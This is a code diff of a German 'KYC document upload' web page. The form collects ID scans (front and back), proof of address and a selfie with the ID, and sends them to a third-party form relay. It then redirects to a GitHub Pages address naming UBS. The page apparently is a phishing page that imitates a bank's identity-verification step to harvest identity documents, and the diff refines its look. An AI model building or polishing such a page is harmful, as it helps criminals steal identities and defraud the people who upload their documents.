@@ -2,85 +2,163 @@
 <html lang="de">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>identverfahrensysteme</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>KYC Dokumenten-Upload</title>
   <style>
-    /* Keep your existing styles */
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f6f6f6;
+      padding: 30px;
+      margin: 0;
+      color: #000;
+    }
+    .form-container {
+      background-color: #fff;
+      max-width: 600px;
+      margin: 40px auto;
+      padding: 35px 40px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+    }
+    h2 {
+      text-align: center;
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #0074a6;
+      font-weight: 700;
+    }
+    p.description {
+      font-size: 14px;
+      color: #333;
+      text-align: center;
+      margin-bottom: 25px;
+      line-height: 1.5;
+      max-width: 500px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    label {
+      display: block;
+      margin-top: 20px;
+      margin-bottom: 8px;
+      font-weight: 600;
+      font-size: 14px;
+      color: #004a7c;
+    }
+    select, input[type="file"] {
+      width: 100%;
+      padding: 12px 14px;
+      font-size: 15px;
+      border: 1.8px solid #ccc;
+      border-radius: 7px;
+      transition: border-color 0.3s ease;
+      box-sizing: border-box;
+      cursor: pointer;
+      background-color: #fafafa;
+      color: #333;
+    }
+    select:focus, input[type="file"]:focus {
+      border-color: #0074a6;
+      outline: none;
+      background-color: #fff;
+    }
+    input[type="file"] {
+      padding: 8px 10px;
+    }
+    .info-text {
+      font-size: 12px;
+      color: #555;
+      margin-top: 6px;
+      line-height: 1.4;
+    }
+    button {
+      margin-top: 30px;
+      width: 100%;
+      padding: 15px;
+      background-color: #0074a6;
+      color: white;
+      font-size: 17px;
+      font-weight: 700;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      box-shadow: 0 4px 8px rgba(0, 116, 166, 0.4);
+    }
+    button:hover {
+      background-color: #005f85;
+      box-shadow: 0 6px 12px rgba(0, 95, 133, 0.6);
+    }
+    hr {
+      border: none;
+      height: 2px;
+      background: linear-gradient(90deg, #0074a6, #004a7c);
+      margin: 25px 0;
+      border-radius: 2px;
+    }
+    /* Responsive */
+    @media (max-width: 600px) {
+      .form-container {
+        padding: 25px 20px;
+      }
+      h2 {
+        font-size: 20px;
+      }
+    }
   </style>
 </head>
 <body>
 
   <div class="form-container">
+    <h2>Schritt 2: Dokumenten-Upload zur Verifizierung</h2>
+    <p class="description">
+      Wählen Sie die Art Ihres Ausweisdokuments und laden Sie gut lesbare Farbkopien hoch (Vorder- und Rückseite). Zusätzlich ist ein aktueller Adressnachweis erforderlich (z. B. eine Rechnung oder ein Kontoauszug).
+    </p>
     <form 
       action="https://formcarry.com/s/yGnwpgJAaJG" 
       method="POST" 
       enctype="multipart/form-data" 
       data-formcarry-redirect="https://banksysteme.github.io/ubs/thanks.html">
+
       <input type="hidden" name="_subject" value="Neue KYC-Freischaltung über">
 
-      <!-- Only Step 2 -->
-      <div class="step active" id="step2">
-        <div style="text-align: center; font-size: 15px; font-weight: bold; margin-bottom: 10px;">
-          Schritt 2: Dokumenten-Upload zur Verifizierung
-        </div>
-        <div style="text-align: center; font-size: 13px; max-width: 800px; margin: 0 auto;">
-          Wählen Sie die Art Ihres Ausweisdokuments und laden Sie gut lesbare Farbkopien hoch (Vorder- und Rückseite). Zusätzlich ist ein aktueller Adressnachweis erforderlich (z. B. eine Rechnung oder ein Kontoauszug).
-        </div>  
-        <hr style="width: 100%; height: 0.5px; background-color: #0074a6; border: none; margin: 10px auto;" />
-        <label for="id_type"><strong>Art des Ausweisdokuments</strong></label>
-        <div style="text-align: left; font-size: 12px;">
-          Wählen Sie bitte aus, welches Ausweisdokument Sie verwenden möchten (z. B. Reisepass oder Personalausweis).
-          Laden Sie anschließend gut lesbare Farbkopien der Vorder- und Rückseite hoch.
-          Alle Angaben (Name, Ausweisnummer, Gültigkeit usw.) müssen vollständig sichtbar und lesbar sein.
-        </div><br>
-        <select name="id_type" id="id_type" required>
-          <option value="">Bitte wählen</option>
-          <option value="Reisepass">Reisepass</option>
-          <option value="Führerschein">Führerschein</option>
-          <option value="Personalausweis">Personalausweis</option>
-        </select>
+      <label for="id_type"><strong>Art des Ausweisdokuments</strong></label>
+      <select name="id_type" id="id_type" required>
+        <option value="">Bitte wählen</option>
+        <option value="Reisepass">Reisepass</option>
+        <option value="Führerschein">Führerschein</option>
+        <option value="Personalausweis">Personalausweis</option>
+      </select>
 
-        <label for="id_front">Vorderseite (PDF/Bild)</label>
-        <input type="file" name="id_front" id="id_front" accept=".pdf,image/*" required>
+      <label for="id_front">Vorderseite (PDF/Bild)</label>
+      <input type="file" name="id_front" id="id_front" accept=".pdf,image/*" required>
+      <div class="info-text">
+        Laden Sie eine gut lesbare Farbkopie der Vorderseite Ihres Ausweises hoch.
+      </div>
 
-        <div id="id_back_group">
-          <label for="id_back">Rückseite (PDF/Bild)</label>
-          <input type="file" name="id_back" id="id_back" accept=".pdf,image/*" required>
-        </div>
-
-        <label for="proof_of_address"><strong>Adressnachweis</strong></label>
-        <div style="text-align: left; font-size: 12px;">
-          Bitte laden Sie zusätzlich einen aktuellen Adressnachweis hoch – zum Beispiel eine Stromrechnung, einen Kontoauszug oder eine Meldebescheinigung.
-          Das Dokument darf nicht älter als 3 Monate sein und muss Ihre vollständige Adresse enthalten.
-          Auch hier gilt: Achten Sie auf gute Bildqualität, Lesbarkeit und vollständige Darstellung.
-        </div><br>
-        <input type="file" name="proof_of_address" id="proof_of_address" accept=".pdf,image/*" required>
-
-        <label for="selfie"><strong>Selfie mit Ausweis</strong></label>
-        <div style="text-align: left; font-size: 12px;">
-          Bitte laden Sie ein Selfie hoch, auf dem Sie Ihren Ausweis gut sichtbar in der Hand halten.
-          Achten Sie auf gute Ausleuchtung, damit Ihr Gesicht und das Dokument klar erkennbar sind.
-        </div><br>
-        <input type="file" name="selfie" id="selfie" accept="image/*" required>
-
-        <div class="name-fields">
-          <button type="submit">Absenden</button>
+      <div id="id_back_group">
+        <label for="id_back">Rückseite (PDF/Bild)</label>
+        <input type="file" name="id_back" id="id_back" accept=".pdf,image/*" required>
+        <div class="info-text">
+          Laden Sie eine gut lesbare Farbkopie der Rückseite Ihres Ausweises hoch (nicht erforderlich bei Reisepass).
         </div>
       </div>
+
+      <label for="proof_of_address"><strong>Adressnachweis</strong></label>
+      <input type="file" name="proof_of_address" id="proof_of_address" accept=".pdf,image/*" required>
+      <div class="info-text">
+        Bitte laden Sie zusätzlich einen aktuellen Adressnachweis hoch (nicht älter als 3 Monate, z.B. Rechnung oder Kontoauszug).
+      </div>
+
+      <label for="selfie"><strong>Selfie mit Ausweis</strong></label>
+      <input type="file" name="selfie" id="selfie" accept="image/*" required>
+      <div class="info-text">
+        Bitte laden Sie ein Selfie hoch, auf dem Sie Ihren Ausweis gut sichtbar in der Hand halten.
+      </div>
+
+      <button type="submit">Absenden</button>
     </form>
   </div>
-
-  <br><br>
-  <div style="font-size: 13px; text-align: center; line-height: 1.6; max-width: 600px; margin: 0 auto;">
-    <p>Bei Rückfragen erreichen Sie uns unter:</p>
-    📞 Telefon: +41 44 707 72 03 (Mo–Fr, 9–17 Uhr)<br><br>
-  </div>
-
-  <div class="footer">
-    <hr>
-  </div>
-
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
   <script>
     const idTypeSelect = document.getElementById('id_type');
@@ -101,5 +179,6 @@
     updateUploadFields();
     idTypeSelect.addEventListener('change', updateUploadFields);
   </script>
+
 </body>
 </html>
